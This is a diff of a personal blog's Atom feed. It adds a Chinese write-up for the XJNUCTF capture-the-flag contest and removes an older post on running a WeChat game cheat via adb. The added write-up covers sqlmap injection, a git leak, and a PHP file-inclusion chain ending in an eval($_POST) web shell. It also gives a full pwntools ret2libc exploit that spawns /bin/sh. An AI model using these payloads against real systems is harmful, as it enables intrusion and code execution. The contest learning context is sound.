@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://iosmosis.github.io/"/>
-  <updated>2018-10-04T09:08:58.536Z</updated>
+  <updated>2018-10-04T12:00:14.186Z</updated>
   <id>http://iosmosis.github.io/</id>
   
   <author>
@@ -16,11 +16,201 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>XJNUCTF-Writeup</title>
+    <link href="http://iosmosis.github.io/2018/10/04/XJNUCTF-Writeup/"/>
+    <id>http://iosmosis.github.io/2018/10/04/XJNUCTF-Writeup/</id>
+    <published>2018-10-04T09:57:59.000Z</published>
+    <updated>2018-10-04T12:00:14.186Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h3><p><img src="/2018/10/04/XJNUCTF-Writeup/1.png" alt="1"></p>
+<p>查看</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/2.png" alt="2"></p>
+<p>得到提示 应该是注入</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/3.png" alt="3"></p>
+<p>测试发现这里存在sql语句查询</p>
+<p>所以用sqlmap这个工具跑一下就可以了</p>
+<p>sqlmap.py -u “<a href="http://ctf.xjnu.edu.cn:9900/web10/index.php?id=1" target="_blank" rel="external">http://ctf.xjnu.edu.cn:9900/web10/index.php?id=1</a>“</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/4.jpg" alt="4"></p>
+<p>确实存在注入</p>
+<p>sqlmap.py -u “<a href="http://ctf.xjnu.edu.cn:9900/web10/index.php?id=1" target="_blank" rel="external">http://ctf.xjnu.edu.cn:9900/web10/index.php?id=1</a>“ –tables</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/5.png" alt="5"></p>
+<p>得到flag表 那我们dump出来看一下</p>
+<p>sqlmap.py -u “<a href="http://ctf.xjnu.edu.cn:9900/web10/index.php?id=1" target="_blank" rel="external">http://ctf.xjnu.edu.cn:9900/web10/index.php?id=1</a>“ –dump -T flag</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/C:/Users\TTTR\ios\source\_posts\XJNUCTF-Writeup\6.png" alt="6"></p>
+<h3 id="Web20"><a href="#Web20" class="headerlink" title="Web20"></a>Web20</h3><p><img src="/2018/10/04/XJNUCTF-Writeup/7.png" alt="7"></p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/8.png" alt="8"></p>
+<p>弹出提示 你不属于这里 </p>
+<p>猜测需要伪造访问ip</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/9.png" alt="9"></p>
+<p>配置好burp代理</p>
+<p>抓包伪造ip</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/10.png" alt="10"></p>
+<p>提示未登录 修改0为1</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/11.png" alt="11"></p>
+<p>她会提示你用的不是iphone 999</p>
+<p>利用谷歌浏览器模拟iphone客户端</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/12.png" alt="12"></p>
+<p>抓包</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/13.png" alt="13"></p>
+<p>得到iPhonex的地址</p>
+<p>修改os版本</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/14.png" alt="14"></p>
+<p>得到flag</p>
+<h3 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h3><p><img src="/2018/10/04/XJNUCTF-Writeup/15.png" alt="15"></p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/16.png" alt="16"></p>
+<p>提示 flag就在index.php中 但是没办法查看 猜测为git泄露</p>
+<p>使用工具githack</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/17.png" alt="17"></p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/18.png" alt="18"></p>
+<p>得到flag</p>
+<h3 id="Web100"><a href="#Web100" class="headerlink" title="Web100"></a>Web100</h3><p><img src="/2018/10/04/XJNUCTF-Writeup/19.png" alt="19"></p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/20.png" alt="20"></p>
+<p>发现url处存在文件包含</p>
+<p>尝试读取upload.php源码</p>
+<p></p><p class="code-caption" data-lang="php+html" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-php+html"><code class="language-php+html">http://ctf.xjnu.edu.cn:666/index.php?file=php://filter/read=convert.base64-encode/resource=upload.php
+</code></pre>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/21.png" alt="21"></p>
+<p>Base64解密即可得到源码</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/22.png" alt="22"></p>
+<p>发现upload目录可任意读取下载,</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/23.png" alt="23"></p>
+<p>打开得到源码</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/24.png" alt="24"></p>
+<p>过滤了%00</p>
+<p>这里用到了王松师傅的思路</p>
+<p><a href="https://www.hackersb.cn/hacker/105.html" target="_blank" rel="external">https://www.hackersb.cn/hacker/105.html</a></p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/25.png" alt="25"></p>
+<p>测试创建一个php文件</p>
+<p>接着压缩修改后缀名为 ss.png</p>
+<p>Exp</p>
+<p></p><p class="code-caption" data-lang="php+html" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-php+html"><code class="language-php+html">http://ctf.xjnu.edu.cn:666/index.php?file=zip://upload/ss.png%23he.html.php
+</code></pre>
+<p>成功执行命令</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/26.png" alt="26"></p>
+<p>写入一句话</p>
+<p></p><p class="code-caption" data-lang="php" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span>
+</code></pre>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/27.png" alt="27"></p>
+<p>成功拿到shell</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/28.png" alt="28"></p>
+<p>成功拿到flag</p>
+<h3 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-70h]</span>
+
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This time, no system() and NO SHELLCODE!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What do you plan to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//漏洞存在点</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"send success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>程序很简单 没有多余的流程 漏洞也很明显</p>
+<p>检查保护</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ checksec babypwn
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/babypwn'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
+ubuntu@ubuntu:~$
+</code></pre>
+<p>NX开启 </p>
+<p>思路：</p>
+<p>通过溢出leak puts 从而得到libc版本 进而得到system地址及bin/sh地址 </p>
+<p>偏移计算 offset = 0x70+8 </p>
+<p>构造leak</p>
+<p>寻找gadget</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ ROPgadget --binary babypwn --only <span class="token string">"pop|ret"</span>
+Gadgets information
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+0x000000000040071c <span class="token keyword">:</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
+0x000000000040071e <span class="token keyword">:</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
+0x0000000000400720 <span class="token keyword">:</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
+0x0000000000400722 <span class="token keyword">:</span> pop r15 <span class="token punctuation">;</span> ret
+0x000000000040071b <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
+0x000000000040071f <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
+0x0000000000400595 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> ret
+0x0000000000400723 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret  // 这里是我们需要的
+0x0000000000400721 <span class="token keyword">:</span> pop rsi <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
+0x000000000040071d <span class="token keyword">:</span> pop rsp <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
+0x00000000004004e1 <span class="token keyword">:</span> ret
+0x00000000004005c5 <span class="token keyword">:</span> ret 0xc148
+
+Unique gadgets found: 12
+</code></pre>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babypwn'</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'babypwn'</span><span class="token punctuation">)</span>
+
+puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+
+<span class="token keyword">print</span> <span class="token string">'puts_plt:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>
+puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span> <span class="token string">'puts_got:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
+start_addr <span class="token operator">=</span> <span class="token number">0x400550</span>
+pop_rdi<span class="token operator">=</span><span class="token number">0x400723</span> <span class="token comment" spellcheck="true">#pop rdi ; ret</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What do you plan to do?\n"</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">120</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span>
+payload <span class="token operator">=</span>  溢出偏移<span class="token operator">+</span>pop_rdi_ret（因为<span class="token number">64</span>位下以寄存器传参）<span class="token operator">+</span>给puts<span class="token punctuation">(</span><span class="token punctuation">)</span>赋值<span class="token operator">+</span>循环地址<span class="token punctuation">(</span>也可以是leak该puts的函数地址<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"send success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+
+puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
+<span class="token operator">&lt;</span>p <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"code-caption"</span> data<span class="token operator">-</span>lang<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data<span class="token operator">-</span>trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data<span class="token operator">-</span>label_position<span class="token operator">=</span><span class="token string">"outer"</span> data<span class="token operator">-</span>labels_left<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_right<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
+</code></pre>
+<p>通过<a href="https://libc.blukat.me" target="_blank" rel="external">https://libc.blukat.me</a> 进行查询</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/libcsearch.jpg" alt="libcsearch"></p>
+<p>找到libc版本 接着获取system地址及binsh地址</p>
+<pre class=" language-python"><code class="language-python">system <span class="token operator">=</span> puts <span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
+binsh <span class="token operator">=</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+binsh <span class="token operator">=</span> puts <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token operator">+</span> binsh
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">120</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span> 
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>成功getshell</p>
+<h2 id="RE50"><a href="#RE50" class="headerlink" title="RE50"></a>RE50</h2><p><img src="/2018/10/04/XJNUCTF-Writeup/29.png" alt="29"></p>
+<p>使用IDA打开</p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/30.png" alt="30"></p>
+<p>定位到main函数</p>
+<p>看到一些常量 </p>
+<p><img src="/2018/10/04/XJNUCTF-Writeup/31.png" alt="31"></p>
+<p>拼接 即可获得flag</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;Web10&quot;&gt;&lt;a href=&quot;#Web10&quot; class=&quot;headerlink&quot; title=&quot;Web10&quot;&gt;&lt;/a&gt;Web10&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/2018/10/04/XJNUCTF-Writeup/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
+
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>picoctf-Writeup</title>
     <link href="http://iosmosis.github.io/2018/10/02/picoctf-Writeup/"/>
     <id>http://iosmosis.github.io/2018/10/02/picoctf-Writeup/</id>
     <published>2018-10-02T12:05:03.000Z</published>
-    <updated>2018-10-04T09:08:58.536Z</updated>
+    <updated>2018-10-04T09:55:22.426Z</updated>
     
     <content type="html"><![CDATA[<h3 id="buffer-overflow-0"><a href="#buffer-overflow-0" class="headerlink" title="buffer overflow 0"></a>buffer overflow 0</h3><p>查看程序源代码</p>
 <p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
@@ -2744,9 +2934,9 @@ S <span class="token operator">=</span> Solver<span class="token punctuation">(<
     
       <category term="WEB" scheme="http://iosmosis.github.io/tags/WEB/"/>
     
-      <category term="RE" scheme="http://iosmosis.github.io/tags/RE/"/>
-    
       <category term="BUPT" scheme="http://iosmosis.github.io/tags/BUPT/"/>
+    
+      <category term="RE" scheme="http://iosmosis.github.io/tags/RE/"/>
     
   </entry>
   
@@ -3478,13 +3668,13 @@ str<span class="token operator">=</span><span class="token string">""</span>
     </summary>
     
     
-      <category term="北邮网安杯" scheme="http://iosmosis.github.io/tags/%E5%8C%97%E9%82%AE%E7%BD%91%E5%AE%89%E6%9D%AF/"/>
+      <category term="RE" scheme="http://iosmosis.github.io/tags/RE/"/>
     
       <category term="Writeup" scheme="http://iosmosis.github.io/tags/Writeup/"/>
     
-      <category term="RE" scheme="http://iosmosis.github.io/tags/RE/"/>
-    
       <category term="Web" scheme="http://iosmosis.github.io/tags/Web/"/>
+    
+      <category term="北邮网安杯" scheme="http://iosmosis.github.io/tags/%E5%8C%97%E9%82%AE%E7%BD%91%E5%AE%89%E6%9D%AF/"/>
     
   </entry>
   
@@ -3766,11 +3956,11 @@ int main<span class="token punctuation">(</span>int argc<span class="token punct
     </summary>
     
     
+      <category term="强网杯" scheme="http://iosmosis.github.io/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
+    
       <category term="Writeup" scheme="http://iosmosis.github.io/tags/Writeup/"/>
     
       <category term="Web" scheme="http://iosmosis.github.io/tags/Web/"/>
-    
-      <category term="强网杯" scheme="http://iosmosis.github.io/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
     
   </entry>
   
@@ -4502,68 +4692,6 @@ oh<span class="token operator">!</span> you get this flag<span class="token oper
       <category term="Hexo" scheme="http://iosmosis.github.io/tags/Hexo/"/>
     
       <category term="修复问题" scheme="http://iosmosis.github.io/tags/%E4%BF%AE%E5%A4%8D%E9%97%AE%E9%A2%98/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>微信游戏跳一跳之简单配置使用waigua</title>
-    <link href="http://iosmosis.github.io/2017/12/31/jump/"/>
-    <id>http://iosmosis.github.io/2017/12/31/jump/</id>
-    <published>2017-12-31T13:59:46.000Z</published>
-    <updated>2017-12-31T14:57:25.318Z</updated>
-    
-    <content type="html"><![CDATA[<p>为啥写这篇文章0.0  因为总有人在问adb是什么啊？怎么用啊？为什么我运行不了？之类的问题<br>就来写一篇指导文章</p>
-<h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><p>1.逍遥模拟器并启动Android5.1系统<br>2.jump文件</p>
-<ul>
-<li><a id="more"></a>
-</li>
-</ul>
-<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>启动模拟器并下载好最新版微信<br>打开跳一跳 并点击开始游戏<br><a href="http://imglf5.nosdn.127.net/img/L241Y0htMkgzZUF3a0x0eDhTU2tvalRqSzRyM2R1b01WdElwQUcwMWFmVWdTU29lNTYvd0dBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">wechat.png</a></p>
-<p>接着打开找到逍遥模拟器安装路径并找到附带的adb路径</p>
-<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre><code>D:\Program Files\Microvirt\MEmu
-</code></pre><p><a href="http://imglf5.nosdn.127.net/img/L241Y0htMkgzZUF3a0x0eDhTU2tvdVE0czFZMVcvT0VoWGkyd0JJTEZ4K0xNeloyb2hVK1dBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">dir.png</a></p>
-<p>在此目录启动cmd 查看监听端口<br>并且启动adb服务</p>
-<p><a href="http://imglf5.nosdn.127.net/img/L241Y0htMkgzZUF3a0x0eDhTU2tvamVweDlEeXVIS3QvTXJIcUE0NFhjWG5obHY1eC8wMmNBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">start.png</a></p>
-<p>接着把准备好的jump文件放在adb所在目录<br>接下来就可以push了</p>
-<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-bash"><code class="language-bash">adb push ./youjumpijump /data/local/tmp/youjumpijump
-</code></pre>
-<p><a href="http://imglf3.nosdn.127.net/img/L241Y0htMkgzZUF3a0x0eDhTU2tvdjNWRE56YzJOdnVVMUlNM1lDTE5iYkFCbVFZWG5JTG53PT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">push.png</a></p>
-<p>接着运行shell </p>
-<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-bash"><code class="language-bash">adb shell
-</code></pre>
-<p>转到目录/data/local/tmp<br>查看当前目录 </p>
-<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-bash"><code class="language-bash"><span class="token function">ls</span>
-</code></pre>
-<p>修改waigua文件的权限</p>
-<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-bash"><code class="language-bash"><span class="token function">chmod</span> 777 youjumpijump
-</code></pre>
-<p><a href="http://imglf5.nosdn.127.net/img/L241Y0htMkgzZUI1d05VS3ZGNnJtZE5tazVhVmRLa1lZSVdmdGg0emgzZVFOYnlOMTRzMkpBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">shell.png</a></p>
-<p>最后就是启动waigua输入参数即可~</p>
-<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-bash"><code class="language-bash">./youjumpijump
-2.04
-</code></pre>
-<p><a href="http://imglf3.nosdn.127.net/img/L241Y0htMkgzZUI1d05VS3ZGNnJtZFlzVkRjVHNzcERoMTdTdmttVlBCVWNFVysyYjA3SmlBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">result.png</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;为啥写这篇文章0.0  因为总有人在问adb是什么啊？怎么用啊？为什么我运行不了？之类的问题&lt;br&gt;就来写一篇指导文章&lt;/p&gt;
-&lt;h3 id=&quot;准备环境&quot;&gt;&lt;a href=&quot;#准备环境&quot; class=&quot;headerlink&quot; title=&quot;准备环境&quot;&gt;&lt;/a&gt;准备环境&lt;/h3&gt;&lt;p&gt;1.逍遥模拟器并启动Android5.1系统&lt;br&gt;2.jump文件&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="WeChat" scheme="http://iosmosis.github.io/tags/WeChat/"/>
-    
-      <category term="AI外挂" scheme="http://iosmosis.github.io/tags/AI%E5%A4%96%E6%8C%82/"/>
     
   </entry>
   
